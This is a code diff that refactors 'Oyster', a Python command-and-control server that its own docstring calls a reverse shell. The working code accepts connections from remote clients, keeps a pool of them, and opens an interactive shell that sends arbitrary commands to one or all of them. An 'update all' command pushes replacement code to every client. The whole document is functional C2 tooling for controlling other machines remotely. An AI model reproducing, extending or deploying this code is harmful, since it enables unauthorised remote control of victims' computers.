@@ -1,15 +1,222 @@
 from time import sleep
+from os.path import expanduser
+from os import execv
 import socket
 import sys
 import threading
-from queue import Queue
+from uuid import uuid4
+from client import Client
+
+
+class Connection(object):
+    def __init__(self, connection, address, recv_size=1024):
+        self.connection = connection
+        self.ip, self.port = address[0], address[1]
+        self.recv_size = int(recv_size)
+
+    def close(self):
+        """
+        Close the connection.
+
+        :return:
+        """
+
+        self.send_command('disconnect')
+        closing = True
+        while closing:
+            try:
+                self.connection.close()
+            except:
+                continue
+            closing = False
+        return self
+
+    def send_command(self, command, echo=False):
+        """
+        Send a command to the connection.
+
+        :param command:
+        :return:
+        """
+
+        if echo:
+            print('Sending Command: {}'.format(command))
+        self.connection.send(str.encode(command + '~!_TERM_$~'))
+        return self.get_response()
+
+    def get_response(self, echo=False):
+        """
+        Receive a response from the server.
+
+        :return:
+        """
+
+        data_package = ''
+        while True:
+            try:
+                data = self.connection.recv(self.recv_size)
+            except ConnectionResetError:
+                print('Connection reset by peer.')
+                break
+            if len(data) < 1:
+                continue
+            d = data.decode('utf-8')
+            data_package += d
+            # print('Data:', repr(d))
+            if data_package[-10:] == '~!_TERM_$~':
+                # print('Got termination string!')
+                break
+
+        data_package = data_package[:-10]
+        if echo:
+            print('Response: {}'.format(data_package))
+        return data_package
+
+
+class ConnectionManager(object):
+    def __init__(self):
+        self.connections = {}
+        self.session_id = uuid4()
+        self.current_connection = None
+
+    def __iter__(self):
+        for k, v in self.connections.items():
+            yield k, v
+
+    def __len__(self):
+        return len(self.connections)
+
+    def __getitem__(self, item):
+        return self.connections[item]
+
+    def __setitem__(self, key, value):
+        self.connections[key] = value
+
+    def __delitem__(self, key):
+        del self.connections[key]
+
+    def __str__(self):
+        """
+        Print out the client data.
+
+        :return:
+        """
+
+        c = 0
+        client_data = "-------- Clients --------\n"
+        for key, connection in self.connections.items():
+            client_data += '[{}]'.format(c) + '   ' + key + '   ' + str(connection.port)
+            c += 1
+        return client_data
+
+    def use_connection(self, ip):
+        """
+        Use the given IP as the current connection.
+
+        :param ip:
+        :return:
+        """
+
+        if ip is None:
+            self.current_connection = None
+            return None
+        try:
+            self.current_connection = self.connections[str(ip)]
+        except KeyError:
+            print('No connection for the given IP address')
+            return None
+        return self.current_connection
+
+    def send_command(self, command, echo=False):
+        """
+        Send a command to a specific client.
+
+        :param ip:
+        :param command:
+        :param echo:
+        :return:
+        """
+
+        if self.current_connection is None:
+            print('Run the `use` command to select a connection by ip address before sending commands.')
+            return ''
+        response = self.current_connection.send_command(command)
+
+        if echo:
+            print(response)
+        return response
+
+    def send_commands(self, command, echo=False):
+        """
+        Send a command to all of the clients.
+
+        :param command:
+        :param echo:
+        :return:
+        """
+
+        response = ''
+        for ip, connection in self.connections.items():
+            response += connection.send_command(command)
+
+        if echo:
+            print(response)
+        return response
+
+    def close_all_connections(self):
+        """
+        Close all the connections in the pool.
+
+        :return:
+        """
+
+        for key, connection in self.connections.items():
+            self.close_connection(key)
+
+        self.connections = {}
+        return self
+
+    def close_connection(self, ip_address):
+        """
+        Close and remove a connection from the connection pool.
+
+        :param ip_address:
+        :return:
+        """
+
+        self.connections[ip_address].close()
+        return self
+
+    def server_should_shutdown(self, address):
+        """
+        Check to see if the given address connected with a shutdown command for the server.
+
+        :param address:
+        :return:
+        """
+
+        return True if self.connections[address].send_command('server_shutdown?') == 'Y' else False
+
+    def add_connection(self, connection, address):
+        """
+        Add a connection to the connection pool.
+
+        :param connection:
+        :param address:
+        :return:
+        """
+
+        self.connections[str(address[0])] = Connection(connection, address)
+        # conn.send_command('set-session-id {}'.format(self.session_id))
+        return self
 
 
 class Server(object):
     """
     A simple command and control server(Reverse Shell).
     """
-    def __init__(self, queue, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, timeout=-1):
+    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=False):
+        self.header = header
         header = """\n .oOOOo.
 .O     o.
 O       o               O
@@ -20,43 +227,34 @@ o       O o   O `Ooo.   O   OooO'  o
  `OoooO'  `OoOO `OoO'   `oO `OoO'  o
               o
            OoO'                         """
-        print(header, end='\n\n')
-        self.queue = queue
+        if self.header:
+            print(header, end='\n\n')
         self.host = host
         self.port = int(port)
         self.recv_size = int(recv_size)
         self.listen = int(listen)
         self.bind_retry = bind_retry
 
-        self.client_platform = ''
+        self.socket = None
 
-        self.socket = False
-
-        self.connections = []
-        self.addresses = []
-
-        self.timeout = int(timeout)
-
-        self.term_string = 'Oyster> '
-
-        self.times_out = True
-        if self.timeout == -1:
-            self.times_out = False
+        self.connection_mgr = ConnectionManager()
+        self.create_socket()
+        self.bind_socket()
 
     def create_socket(self):
-        # Create the socket
+        """
+        Create the socket.
+
+        :return:
+        """
+
         try:
             self.socket = socket.socket()
-            if self.times_out:
-                self.timeout = float(self.timeout)
-                self.socket.settimeout(self.timeout)
-            else:
-                self.timeout = None
         except socket.error as error_message:
             print('Could not create socket:', error_message)
             sys.exit()
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        return
+        return self
 
     def bind_socket(self, attempts=1):
         """
@@ -71,6 +269,7 @@ o       O o   O `Ooo.   O   OooO'  o
             self.socket.bind((self.host, self.port))
             self.socket.listen(self.listen)
             print('waiting for client connections...', end='\n\n')
+            self.set_cli('Oyster> ')
 
         except socket.error as error_message:
             print('Could not bind the socket:', error_message, '\n', 'Trying again...')
@@ -81,6 +280,7 @@ o       O o   O `Ooo.   O   OooO'  o
                 print('Could not bind the socket to the port after {} tries.  Aborting...'.format(self.bind_retry))
                 sys.exit()
             self.bind_socket(attempts=attempts + 1)
+        return self
 
     def accept_connections(self):
         """
@@ -89,272 +289,174 @@ o       O o   O `Ooo.   O   OooO'  o
         :return:
         """
 
-        for connection in self.connections:
-            connection.close()
-
-        self.connections = []
-        self.addresses = []
-
         while True:
-            try:
-                item = self.queue.get(False)
-            except:
-                item = False
 
-            if item is None:
-                self.shutdown()
-                break
             try:
                 conn, address = self.socket.accept()
-                # conn.setblocking(1)
             except socket.error as e:
-                # print('Error accepting connections: %s' % str(e))
                 # Loop indefinitely
                 continue
-            self.connections.append(conn)
-            self.addresses.append(address)
-            print('\n{} ({}) connected...\n{}'.format(address[0], address[1], self.term_string), end='')
-            # self.queue.task_done()
-        self.queue.task_done()
+
+            if address[0] in self.connection_mgr.connections.keys():
+                continue
+
+            conn_obj = Connection(conn, address, recv_size=self.recv_size)
+            should_connect = conn_obj.send_command('connect {}'.format(self.connection_mgr.session_id))
+            should_connect = True if should_connect == 'True' else False
+            if should_connect:
+                self.connection_mgr.add_connection(conn, address)
+            else:
+                conn_obj.close()
+
+            # Check local addresses.
+            if address[0] == '127.0.0.1':
+                if self.connection_mgr.server_should_shutdown('127.0.0.1'):
+                    self.connection_mgr.close_all_connections()
+                    print('< Listener Thread > Connections no longer being accepted!')
+                    break
+
+            print('\n< Listener Thread > {} ({}) connected...\n{}'.format(address[0], address[1], 'Oyster> '), end='')
         return
 
-    def get_client_platform(self, address, connection):
-        print('Connection | IP', address[0], '| Port', address[1])
-
-        # The client platform is used to determine default commands for
-        # getting the current working directory.
-        print('Getting platform... ', end='')
-        self.client_platform = self.send_command('single_command-get_platform', connection)
-        print('Client platform is "{}".'.format(self.client_platform), end='\n\n')
-
-        # Get the current working directory and print it to the console.
-        self.term_string = self.send_command('single_command-getcwd', connection)
-        print(self.term_string, end='')
-        return self
-
-    def send_command(self, command, connection):
+    def update_clients(self):
         """
-        Send a single command to the client, and return the response.
-        This is used for retrieving info from the clients.
+        Update all the connected clients using the `update.py` file.
 
-        :param command:
-        :param connection:
         :return:
         """
 
-        # Check out the command and make any modifications needed.
-        command = self._check_command(command)
+        print('Starting script upload...')
+        with open('update.py', 'r') as f:
+            file_data = ''
+            for line in f:
+                file_data += line
 
-        # Set defaults.
-        response = '> '
-        accepting = True
+            _c = "update {}".format(file_data)
+            print(self.connection_mgr.send_commands(_c))
+        sleep(.5)
 
-        if not command:
+        print('Finished uploading \'update.py\' to client.')
+        return self
+
+    def set_cli(self, the_string):
+        """
+        Set the command line to equal a certain string.
+
+        :param the_string:
+        :return:
+        """
+
+        print(the_string, end='')
+        return self
+
+    def client_shell(self):
+        """
+        Open up a client shell using the current connection.
+
+        :return:
+        """
+        self.set_cli(self.connection_mgr.send_command('oyster getcwd'))
+        while True:
+            command = input('')
+
+            if command == 'quit' or command == 'exit':
+                print('Disconnecting from client...\nOyster> ', end='')
+                self.connection_mgr.send_command('quit')
+                self.connection_mgr.current_connection = None
+                break
+
+            response = self.connection_mgr.send_command(command)
             print(response, end='')
-
-        # Send the command
-        connection.send(str.encode(command))
-
-        # Accept the response.
-        total_response = ''
-        while accepting:
-            response = str(connection.recv(self.recv_size), 'utf-8')
-            total_response += response.replace('~!_TERM_%~', '')
-
-            # If we get the termination string, stop accepting.
-            if response[-10:] == '~!_TERM_%~':
-                accepting = False
-
-        return total_response
-
-    def list_connections(self):
-        """ List all connections """
-        print('----- Clients -----')
-        for c, conn in enumerate(self.connections):
-            try:
-                conn.send(str.encode(' '))
-                conn.recv(self.recv_size)
-            except:
-                del self.connections[c]
-                del self.addresses[c]
-                continue
-            print('[{}]'.format(c), ' ', self.addresses[c][0], ' ', self.addresses[c][1])
         return
 
-    def get_target(self, cmd):
-        """ Select target client
-        :param cmd:
-        """
-        target = cmd.split(' ')[-1]
-        try:
-            target = int(target)
-        except:
-            print('Client index should be an integer')
-            return None, None
-        try:
-            connection = self.connections[target]
-        except IndexError:
-            print('Not a valid selection')
-            return None, None
-        print("You are now connected to " + str(self.addresses[target][0]))
-        return target, connection
-
     def open_oyster(self):
+        """
+        Run the Oyster shell.
+
+        :return:
+        """
+
         sleep(1)
         while True:
-            try:
-                item = self.queue.get(False)
-            except:
-                item = False
+            command = input()
 
-            if item is None:
-                break
-            command = input('Oyster> ')
             if command == 'list':
-                self.list_connections()
+                print(self.connection_mgr)
+                self.set_cli('Oyster> ')
                 continue
 
-            if 'select' in command:
-                target, connection = self.get_target(command)
-                if connection is not None:
-                    self.send_target_commands(target, connection)
-                    self.term_string = 'Oyster> '
+            if command[:3] == 'use':
+                if command.lower() == 'use none':
+                    self.connection_mgr.use_connection(None)
+                # Use a connection.
+                r = self.connection_mgr.use_connection(command[3:].strip())
+                if r is None:
+                    self.set_cli('Oyster> ')
+                    continue
+
+                self.client_shell()
+                continue
+
+            if command == 'update all':
+                self.update_clients()
+                self.set_cli('Oyster> ')
+                continue
+
+            if command == 'flush':
+                # Flush anything that fucks up the server.
+                self.set_cli('Oyster> ')
                 continue
 
             if command == 'quit' or command == 'exit' or command == 'shutdown':
-                self.queue.put(None)
-                print('Server shutting down...')
-                self.socket.close()
-                continue
+                self.handle_quit()
+                return False
 
-            self.queue.task_done()
-        self.queue.task_done()
+            if self.connection_mgr.current_connection is not None:
+                print(self.connection_mgr.current_connection.send_command(command))
+            self.set_cli('Oyster> ')
         return
 
-    def shutdown(self):
-        for c in self.connections:
-            try:
-                self.send_command('shutdown', c)
-            except OSError:
-                pass
-
-        for c in self.connections:
-            c.close()
-
-        return
-
-    def send_target_commands(self, target, connection):
-        """
-        Send commands through to the clients.
-
-        :return:
-        """
-
-        address = self.addresses[target]
-        self.get_client_platform(address, connection)
-        # Loop while accepting input and sending the commands to the client.
-        while True:
-            command = input(' ')
-            response = '> '
-            accepting = True
-            command = self._check_command(command)
-            if not command:
-                print(response, end='')
-
-            if command == 'quit' or command == 'exit':
-                print('Disconnecting from client...')
-                self.send_command('quit', connection)
-                # sleep(1)
-                self.term_string = 'Oyster> '
-                break
-
-            if command == 'shutdown':
-                self.shutdown()
-                break
-
-            connection.send(str.encode(command))
-            # Accept the response.
-            while accepting:
-                response = str(connection.recv(self.recv_size), 'utf-8')
-                print(response.strip().replace('~!_TERM_%~', ''), end='')
-
-                if response[-10:] == '~!_TERM_%~':
-                    accepting = False
-        del self.connections[target]
-        del self.addresses[target]
-        connection.close()
+    def handle_quit(self):
+        # Open a client with the `server_shutdown` and
+        # `shutdown_kill` flags.  This will tell the
+        # client to tell the servers connection
+        # listener thread to shut itself down.
+        # Since the Oyster Shell thread is
+        # initiating the `quit` command
+        # it knows how to shut down.
+        client_shutdown = Client(
+            port=self.port,
+            recv_size=self.recv_size,
+            server_shutdown=True,
+            shutdown_kill=True
+        )
+        client_shutdown.main()
+        # Close all the connections that have been established.
+        self.connection_mgr.close_all_connections()
         return self
 
-    def main(self):
+    def reboot_self(self):
         """
-        Send commands through to the clients.
+        Reboot this script.
 
         :return:
         """
 
-        # Loop while accepting input and sending the commands to the client.
-        while True:
-            command = input(' ')
-            response = '> '
-            accepting = True
-            command = self._check_command(command)
-            if not command:
-                print(response, end='')
-
-            self.connection.send(str.encode(command))
-            # Accept the response.
-            while accepting:
-                response = str(self.connection.recv(self.recv_size), 'utf-8')
-                print(response.strip().replace('~!_TERM_%~', ''), end='')
-
-                if response[-10:] == '~!_TERM_%~':
-                    accepting = False
-
-        self.connection.close()
-
-    def _check_command(self, command):
-        """
-        Check the command and return True or False, or quit if the quit command is sent.
-
-        :param command:
-        :return:
-        """
-
-        if len(str.encode(command)) > 0:
-            return command
-        else:
-            if self.client_platform == 'win32':
-                return 'echo'
-            else:
-                return 'echo'
-
-
-def worker(the_queue, the_server):
-    while True:
-        item = the_queue.get()
-        if item is None:
-            break
-        if item == 'accept_connections':
-            print('Accepting connections.')
-            the_server.create_socket()
-            the_server.bind_socket()
-            the_server.accept_connections()
-
-        if item == 'run_cli':
-            print('Running cli.')
-            server.open_oyster()
-        # the_queue.task_done()
+        restart_arguments = list(sys.argv)
+        restart_arguments.insert(0, '')
+        execv(sys.executable, restart_arguments)
+        sys.exit()
 
 
 if __name__ == '__main__':
 
     the_host = ''
-    the_port = 6667
+    the_port = 6668
     the_recv_size = 1024
     the_listen = 10
     the_bind_retry = 5
-    the_timeout = 15.0
     the_thread_count = 2
+    the_header = True
 
     def check_cli_arg(arg):
         global the_host
@@ -364,6 +466,7 @@ if __name__ == '__main__':
         global the_bind_retry
         global the_timeout
         global the_thread_count
+        global the_header
 
         if 'host=' in arg:
             the_host = arg.split('=')[1]
@@ -375,42 +478,37 @@ if __name__ == '__main__':
             the_listen = int(arg.split('=')[1])
         elif 'bind_retry=' in arg:
             the_bind_retry = int(arg.split('=')[1])
-        elif 'timeout=' in arg:
-            the_timeout = float(arg.split('=')[1])
         elif 'thread_count=' in arg:
             the_thread_count = int(arg.split('=')[1])
+        elif 'the_header=' in arg:
+            arg = arg.split('=')[1].upper()
+            the_header = True if arg == 'Y' else False
 
     for argument in sys.argv[1:]:
         check_cli_arg(argument)
 
-    queue = Queue()
-
     server = Server(
-        queue,
         host=the_host,
         port=the_port,
         recv_size=the_recv_size,
         listen=the_listen,
         bind_retry=the_bind_retry,
-        timeout=the_timeout
+        header=the_header
     )
 
-    threads = []
+    connection_accepter = threading.Thread(target=server.accept_connections)
+    oyster_shell = threading.Thread(target=server.open_oyster)
+    connection_accepter.setDaemon(True)
+    oyster_shell.setDaemon(True)
 
-    for i in range(the_thread_count):
-        t = threading.Thread(target=worker, args=(queue, server))
-        t.setDaemon(True)
-        t.start()
-        threads.append(t)
+    connection_accepter.start()
+    oyster_shell.start()
 
-    queue.put('accept_connections')
-    queue.put('run_cli')
+    try:
+        connection_accepter.join()
+        oyster_shell.join()
+    except:
+        server.handle_quit()
+        connection_accepter.join()
 
-    queue.join()
-
-    for thread in threads:
-        thread.join()
-
-    sys.exit(0)
-
-
+    print('Shutdown complete!')
